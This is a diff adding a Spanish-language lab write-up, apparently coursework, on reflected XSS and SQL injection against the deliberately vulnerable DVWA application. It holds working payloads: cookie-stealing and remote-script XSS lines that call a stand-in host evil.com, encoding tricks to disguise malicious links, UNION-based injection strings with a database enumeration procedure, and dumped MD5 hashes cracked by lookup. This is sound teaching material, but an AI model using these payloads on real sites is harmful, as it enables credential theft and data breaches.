@@ -268,3 +268,244 @@ gdb -q desbordamiento-vulnerable
 ```
 
 **¡Conseguido!** ¡Hemos sido capaces de ejecutar comandos arbritarios aprovechando la vulnerabilidad del programa!
+
+## 🅱️ Web Exploiting
+---
+
+> ⚠️ Dado que las máquinas virtuales no funcionan correctamente en ninguno de mis ordenadores, como ya se ha notificado vía e-mail, los apartados de XSS y SQLi se realizarán en máquinas vulnerables a dichos fallos, como `Damn Vulnerable Web Application` o similares. En compensación, se realizará un estudio más detallado de dichas vulnerabilidades
+
+### 🔧 Preparación del entorno
+
+Iniciaremos la máquina contenedora de `DVWA` y nos loguearemos con el las credenciales:
+
+        admin:password
+
+Una vez dentro, iremos al apartado `DVWA Security` y bajaremos el nivel de seguridad a **low**.
+
+### 👩‍🎨 XSS
+
+Para probar los ataques `XSS`, tenemos dos opciones:
+
+- XSS Reflected
+- XSS Stored
+
+En mi caso usaré XSS Reflected para realizar pruebas volátiles sin necesidad de reiniciar o eliminar los *payloads*.
+
+En este apartado podemos observar que nos pregunta nuestro nombre y que, si introducimos `Kike`, nos muestra el mensaje:
+
+        Hello Kike
+
+Antes de atacar, vamos a comprobar el código que nos ofrece `DVWA` sobre cómo funciona la aplicación:
+
+```php
+<?php
+
+if(!array_key_exists ("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){
+
+ $isempty = true;
+
+} else {
+        
+ echo '<pre>';
+ echo 'Hello ' . $_GET['name'];
+ echo '</pre>';
+    
+}
+
+?> 
+```
+
+Como podemos observar, sólamente comprueba y obtiene el valor del parámetro `name` pasado mediante peticiones `GET` y lo añade directamente entre etiquetas `<pre>`.
+
+No es difícil imaginar que si le pasamos cualquier código `HTML` lo podremos visualizar con el formato especificado, dado que no comprueba si la entrada consta de caracteres especiales como `<` o `>`:
+
+Varios ejemplos:
+
+- `<b>XSS</b>`
+- `<h1>XSS</h1>`
+- `<marquee>XSS</marquee>` (Este es visualmente bonito)
+
+Pero más allá de formatear texto de maneras vistosas, los ataque XSS sirven para ejecutar código javascript o modificar el comportamiento de la página.
+
+Si introducimos código entre etiquetas `<script>`, podemos obtener resultados muy interesantes:
+
+- `<script>alert('XSS')</script>`
+- `<script>alert(domain.cookie)</script>` (obtener las cookies de un usuario)
+- `<script src="http://evil.com/payload.js"></script>` (bypassear el límite de caracteres del payload pudiendo ejecutar código remoto)
+
+Además también puede ser usado como vector de ataque en campañas de `phishing`, redireccionando a un usuario de la página real a un clon propiedad del atacante:
+
+- `<script>window.location="http://evil.com/"</script>`
+
+---
+
+Algo muy interesante de esto, es que vimos los datos de entrada vienen dados mediante el parámetro `name` provisto en la URL, por lo que podremos realizar estos ataques sólamente pasándole el link malicioso a nuestra víctima:
+
+        https://dwva.local/vulnerabilities/xss_r/?name=<script>alert("HACKED")</script>
+
+Aún así cualquiera podría sospechar de este link, por lo que lo recomendable sería usar un **URL Encoder**:
+
+        https://dwva.local/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22Hacked%22%29%3C%2Fscript%3E
+
+Aún así, sigue siendo un link bastante raro por poder leerse palabras como `script`, `alert` o `HACKED`, por lo que, personalmente, me gusta codificar los *payloads* en hexadecimal:
+
+        https://dwva.local/vulnerabilities/xss_r/?name=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%48%41%43%4b%45%44%22%29%3c%2f%73%63%72%69%70%74%3e
+
+### 🕵️‍♂️ SQLi
+
+Esta vez atacaremos la página mediante `SQL Injection`, lo que nos permitirá acceder a la base de datos.
+
+Para ello, nos iremos a la pestaña `SQL Injection` dentro de `DVWA` y, como de costumbre, nos fijaremos primero en el código `php` que sostiene la página:
+
+```php
+<?php    
+
+if(isset($_GET['Submit'])){
+    
+    // Retrieve data
+    
+    $id = $_GET['id'];
+
+    $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
+    $result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );
+
+    $num = mysql_numrows($result);
+
+    $i = 0;
+
+    while ($i < $num) {
+
+        $first = mysql_result($result,$i,"first_name");
+        $last = mysql_result($result,$i,"last_name");
+        
+        echo '<pre>';
+        echo 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;
+        echo '</pre>';
+
+        $i++;
+    }
+}
+?>
+```
+
+Igual que antes, vemos que sería posible un ataque `XSS` dado que el parámetro `id` se muestra directamente en la página sin ningún tipo de comprobación, pero lo que nos interesa a nosotros ahora mismo es que en la consulta SQL, dicho parámetro se añade en crudo, por lo que podríamos escribir aquello que más nos convenga.
+
+Primero comprobaremos la existencia del error introduciendo una comilla simple `'`. El mensaje que recibimos es el siguiente:
+
+        You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1
+
+Como podemos observar, la página nos devuelve un error (que viene dado por la línea de código `or die('<pre>' . mysql_error() . '</pre>' );`).
+
+En cambio, si introducimos números, podemos comprobar la existencia de todos los usuarios:
+
+        ID: 1
+        First name: admin
+        Surname: admin
+
+Para evitar que se ejecute la primera parte de la sentencia, usaremos el truco: 
+
+```sql
+' or 0=1
+```
+
+Con esto conseguimos que siempre sea falso y nunca nos muestre dicha sentencia programada por defecto.
+
+Ahora necesitamos **unir** la secuencia que deseemos. En mi caso, accederé a la tabla `dvwa.users` que contiene toda la información sobre los usuarios:
+
+```sql
+' or 0=1 UNION SELECT * FROM dvwa.users #
+```
+
+> Con el último símbolo (`#`) nos aseguramos de que cualquier cosa que siga a la sentencia es un comentario.
+
+En cambio, al ejecutar esta sentencia nos aparece un error:
+
+        The used SELECT statements have a different number of columns
+
+Esto viene dado porque en la sentencia original sólamente se muestran dos columnas, por lo que no podemos unir nuestra sentencia si no tiene exactamente dos columnas:
+
+```sql
+' or 0=1 UNION SELECT user,password FROM dvwa.users #
+```
+
+Una vez corregida, sólamente nos queda ejecutar la sentencia:
+
+        ID: ' or 0=1 UNION SELECT user,password FROM dvwa.users #
+        First name: admin
+        Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+        ID: ' or 0=1 UNION SELECT user,password FROM dvwa.users #
+        First name: gordonb
+        Surname: e99a18c428cb38d5f260853678922e03
+
+        ID: ' or 0=1 UNION SELECT user,password FROM dvwa.users #
+        First name: 1337
+        Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+
+        ID: ' or 0=1 UNION SELECT user,password FROM dvwa.users #
+        First name: pablo
+        Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+
+        ID: ' or 0=1 UNION SELECT user,password FROM dvwa.users #
+        First name: smithy
+        Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+Como podemos observar, ya tenemos acceso a la información de la base de datos.
+
+En mi caso ya sabía qué podía obtener de la base de datos, pero aquí dejo mi procedimiento estándar para realizar este tipo de ataques:
+
+- Para saber cuántas columnas puedo mostrar, realizo el comando `1 order by XXX #` hasta que de error, donde `XXX` es un número que empieza en 1 y voy incrementando en cada petición.
+
+- Una vez sepa cuántas columnas puedo mostrar,
+realizo el comando `' or 0=1 union all select XXX #`, donde `XXX` es la sucesión de columnas válidas (en este ejemplo sería `1,2` dado que sólo tenemos dos columnas).
+
+- Para obtener la versión de la base de datos, reemplazo uno de los números por `@@version` o `version()`. SQL: `' or 0=1 union all select @@version,version() #`
+
+        ID: ' or 0=1 union all select @@version,version() #
+        First name: 5.1.65-community-log
+        Surname: 5.1.65-community-log
+
+- Si la base de datos es MySQL < 5, entonces trato de adivinar el nombre de las tablas.
+
+- Si la base de datos es MySQL >= 5, entonces miro la información alojada en `information_schema` mediante el comando:
+
+```sql
+' or 0=1 union all select 1,table_name from information_schema.tables #
+```
+
+        ID: ' or 0=1 union all select 1,table_name from information_schema.tables #
+        First name: 1
+        Surname: CHARACTER_SETS
+
+        ID: ' or 0=1 union all select 1,table_name from information_schema.tables #
+        First name: 1
+        Surname: COLLATIONS
+
+                --- [...] ---
+
+        ID: ' or 0=1 union all select 1,table_name from information_schema.tables #
+        First name: 1
+        Surname: guestbook
+
+        ID: ' or 0=1 union all select 1,table_name from information_schema.tables #
+        First name: 1
+        Surname: users
+
+- El nombre de las columnas se puede averiguar mediante: 
+
+```sql
+' or 0=1 union all select 1,column_name from information_schema.columns #
+```
+
+De aquí en adelante ya todo es **imaginación** y **picardía**.
+
+---
+
+Un dato importante, es que al conseguir los usuarios y contraseñas, vimos que las contraseñas no estaban en texto plano:
+
+        gordonb:e99a18c428cb38d5f260853678922e03
+
+Por la longitud y el formato es fácil preveer que es un `MD5`, lo cual nos viene genial porque en la práctica también pasa lo mismo.
+
+En este caso, si buscamos en páginas como `HashKiller.co.uk` (la cual es de mis favoritas), vemos que dicho `MD5` corresponde a la contraseña `abc123`.
+
